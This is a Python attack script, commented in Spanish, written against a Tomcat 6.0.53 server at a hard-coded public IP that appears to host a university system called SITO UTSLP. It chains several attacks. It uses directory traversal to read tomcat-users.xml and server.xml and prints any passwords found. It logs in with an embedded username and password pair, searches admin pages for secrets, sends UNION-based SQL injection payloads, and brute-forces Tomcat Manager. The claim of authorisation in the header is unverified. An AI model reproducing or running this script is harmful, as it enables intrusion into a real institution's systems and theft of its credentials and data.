#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPLOTACIÓN ESPECÍFICA TOMCAT 6.0.53 - SITO UTSLP
Autor: Estudiante ITI (Autorizado)
Target: 189.254.143.102
"""

import requests
import base64
import xml.etree.ElementTree as ET
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

disable_warnings(InsecureRequestWarning)

class TomcatExploiter:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.verify = False
        self.base_urls = [
            f"http://{target}",
            f"https://{target}"
        ]
        
    def test_connectivity(self):
        """Verifica conectividad básica"""
        print("[+] Probando conectividad...")
        for base_url in self.base_urls:
            try:
                r = self.session.get(base_url, timeout=5)
                print(f"  ✅ {base_url} - Status: {r.status_code}")
            except:
                print(f"  ❌ {base_url} - No accesible")
    
    def exploit_directory_traversal(self):
        """Explota Directory Traversal en Tomcat 6.0.53"""
        print("\n[+] Explotando Directory Traversal...")
        
        traversal_paths = {
            "tomcat-users.xml": [
                "/examples/jsp/include/include.jsp?page=../../../../conf/tomcat-users.xml",
                "/examples/jsp/cal/cal2.jsp?time=../../../../conf/tomcat-users.xml",
                "/examples/jsp/snp/snoop.jsp?page=../../../../conf/tomcat-users.xml"
            ],
            "server.xml": [
                "/examples/jsp/include/include.jsp?page=../../../../conf/server.xml",
                "/examples/jsp/cal/cal2.jsp?time=../../../../conf/server.xml"
            ],
            "web.xml": [
                "/examples/jsp/include/include.jsp?page=../../../../webapps/manager/WEB-INF/web.xml",
                "/examples/jsp/include/include.jsp?page=../../../../WEB-INF/web.xml"
            ]
        }
        
        for file_name, paths in traversal_paths.items():
            print(f"\n🔍 Buscando: {file_name}")
            for path in paths:
                for base_url in self.base_urls:
                    url = base_url + path
                    try:
                        r = self.session.get(url, timeout=10)
                        if r.status_code == 200 and len(r.content) > 1000:
                            print(f"  ✅ ENCONTRADO: {url}")
                            
                            # Guardar archivo
                            filename = f"extracted_{file_name}"
                            with open(filename, 'wb') as f:
                                f.write(r.content)
                            print(f"  💾 Guardado como: {filename}")
                            
                            # Analizar contenido si es XML
                            if file_name.endswith('.xml'):
                                self.analyze_xml_file(filename, file_name)
                            break
                    except Exception as e:
                        continue
    
    def analyze_xml_file(self, filename, file_type):
        """Analiza archivos XML extraídos"""
        try:
            tree = ET.parse(filename)
            root = tree.getroot()
            
            if file_type == "tomcat-users.xml":
                print("\n🔑 ANALIZANDO TOMCAT-USERS.XML:")
                for user in root.findall(".//user"):
                    username = user.get('username', '')
                    password = user.get('password', '')
                    roles = user.get('roles', '')
                    if username:
                        print(f"  👤 Usuario: {username}")
                        print(f"  🔐 Password: {password}")
                        print(f"  🎯 Roles: {roles}")
                        print("  " + "-"*50)
            
            elif file_type == "server.xml":
                print("\n🔧 ANALIZANDO SERVER.XML:")
                # Buscar configuraciones de conexión
                for connector in root.findall(".//Connector"):
                    port = connector.get('port', '')
                    scheme = connector.get('scheme', '')
                    print(f"  🔌 Connector - Puerto: {port}, Scheme: {scheme}")
                
                # Buscar configuraciones de base de datos
                for resource in root.findall(".//Resource"):
                    name = resource.get('name', '')
                    if 'jdbc' in name.lower() or 'db' in name.lower():
                        print(f"  🗄️ Recurso BD: {name}")
                        for child in resource:
                            print(f"    {child.tag}: {child.get('value', '')}")
            
        except Exception as e:
            print(f"  ❌ Error analizando XML: {e}")
    
    def exploit_sito_credentials(self):
        """Explota las credenciales SITO encontradas (hnieto:utslp)"""
        print("\n[+] Explotando credenciales SITO...")
        
        login_data = {
            'yAccion': 'login',
            'yUsuario': 'hnieto',
            'xUsuario': 'hnieto',
            'xContrasena': 'utslp',
            'yIntentos': '1'
        }
        
        for base_url in self.base_urls:
            # Intentar login
            login_url = base_url + "/jsp/index.jsp"
            try:
                r = self.session.post(login_url, data=login_data, timeout=10)
                
                if r.status_code == 200:
                    print(f"  🔄 Probando login en: {login_url}")
                    
                    # Verificar si el login fue exitoso
                    if 'cerrar_sesion' in r.text.lower() or 'hnieto' in r.text:
                        print("  ✅ POSIBLE LOGIN EXITOSO!")
                        
                        # Extraer cookies de sesión
                        if 'JSESSIONID' in r.cookies:
                            jsessionid = r.cookies['JSESSIONID']
                            print(f"  🍪 JSESSIONID: {jsessionid}")
                            self.session.cookies.set('JSESSIONID', jsessionid)
                        
                        # Explorar área autenticada
                        self.explore_authenticated_area(base_url)
                        break
                    
            except Exception as e:
                print(f"  ❌ Error en login: {e}")
    
    def explore_authenticated_area(self, base_url):
        """Explora el área autenticada de SITO"""
        print("\n[+] Explorando área autenticada...")
        
        # Endpoints a probar
        endpoints = [
            "/jsp/admin/",
            "/jsp/configuracion/",
            "/jsp/database/",
            "/jsp/usuarios/",
            "/jsp/reportes/",
            "/jsp/escolar/administracion/",
            "/jsp/admin/usuarios.jsp",
            "/jsp/configuracion/database_config.jsp",
            "/jsp/reportes/generar_reporte.jsp"
        ]
        
        for endpoint in endpoints:
            url = base_url + endpoint
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"  ✅ Accesible: {endpoint}")
                    
                    # Buscar información sensible en la respuesta
                    self.search_sensitive_info(r.text, endpoint)
                    
            except:
                continue
    
    def search_sensitive_info(self, content, endpoint):
        """Busca información sensible en el contenido"""
        sensitive_keywords = [
            'password', 'contraseña', 'pwd', 'passwd',
            'usuario', 'user', 'username',
            'database', 'bd', 'mysql', 'jdbc',
            'connection', 'conn', 'connect',
            'host', 'localhost', '127.0.0.1',
            'root', 'admin', 'administrator'
        ]
        
        lines = content.split('\n')
        for i, line in enumerate(lines):
            line_lower = line.lower()
            for keyword in sensitive_keywords:
                if keyword in line_lower and len(line.strip()) < 200:
                    print(f"    🔍 {endpoint} - Línea {i+1}: {line.strip()}")
                    break
    
    def exploit_ajax_endpoints(self):
        """Explota endpoints AJAX descubiertos"""
        print("\n[+] Explotando endpoints AJAX...")
        
        ajax_endpoints = [
            "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp",
            "/jsp/escolar/muestra_bachillerato_ajax.jsp"
        ]
        
        sql_payloads = [
            "1 UNION SELECT user(),database(),version()--",
            "1 UNION SELECT table_name,table_schema,3 FROM information_schema.tables--",
            "1 UNION SELECT column_name,2,3 FROM information_schema.columns--",
            "1 UNION SELECT @@version,@@hostname,@@datadir--"
        ]
        
        for endpoint in ajax_endpoints:
            print(f"\n🔍 Probando: {endpoint}")
            
            for base_url in self.base_urls:
                # Test normal
                normal_url = base_url + endpoint + "?xCveBachillerato=1"
                try:
                    r = self.session.get(normal_url, timeout=5)
                    if r.status_code == 200:
                        print(f"  ✅ Normal: {r.status_code} - Tamaño: {len(r.content)}")
                        if len(r.content) < 1000:  # Respuesta corta probablemente válida
                            print(f"    📄 Respuesta: {r.text[:200]}...")
                        
                        # Probar inyecciones SQL
                        for payload in sql_payloads:
                            test_url = base_url + endpoint + f"?xCveBachillerato={payload}"
                            try:
                                r_test = self.session.get(test_url, timeout=5)
                                if r_test.status_code != 404 and r_test.status_code != 500:
                                    print(f"  🚨 Posible SQLi: {payload[:50]}...")
                                    print(f"    Status: {r_test.status_code}, Tamaño: {len(r_test.content)}")
                            except:
                                pass
                        break
                except:
                    continue
    
    def brute_force_tomcat_manager(self):
        """Fuerza bruta específica para Tomcat Manager"""
        print("\n[+] Fuerza bruta Tomcat Manager...")
        
        # Combinaciones basadas en hallazgos previos
        credentials = [
            ('hnieto', 'utslp'), ('hnieto', 'admin'), ('hnieto', 'tomcat'),
            ('admin', 'utslp'), ('tomcat', 'utslp'), ('manager', 'utslp'),
            ('admin', 'admin'), ('tomcat', 'tomcat'), ('both', 'tomcat'),
            ('role1', 'role1'), ('sito', 'sito'), ('hnieto', 'hnieto123'),
            ('hnieto', 'Hnieto123'), ('hnieto', 'Hnieto@123'),
            ('utslp', 'utslp'), ('utslp', 'admin'), ('utslp', 'tomcat')
        ]
        
        manager_urls = [
            "/manager/html",
            "/manager/status",
            "/manager/jmxproxy"
        ]
        
        for manager_url in manager_urls:
            print(f"\n🔐 Probando: {manager_url}")
            for base_url in self.base_urls:
                url = base_url + manager_url
                for username, password in credentials:
                    try:
                        r = self.session.get(url, auth=(username, password), timeout=5)
                        if r.status_code == 200:
                            print(f"  ✅ CREDENCIALES VÁLIDAS: {username}:{password}")
                            print(f"  📍 URL: {url}")
                            return
                    except:
                        pass
    
    def run_complete_exploitation(self):
        """Ejecuta la explotación completa"""
        print("="*60)
        print("EXPLOTACIÓN TOMCAT 6.0.53 - SITO UTSLP")
        print("="*60)
        
        self.test_connectivity()
        self.exploit_directory_traversal()
        self.exploit_sito_credentials()
        self.exploit_ajax_endpoints()
        self.brute_force_tomcat_manager()
        
        print("\n" + "="*60)
        print("EXPLOTACIÓN COMPLETADA")
        print("="*60)

# Ejecutar explotación
if __name__ == "__main__":
    target = "189.254.143.102"
    exploiter = TomcatExploiter(target)
    exploiter.run_complete_exploitation()
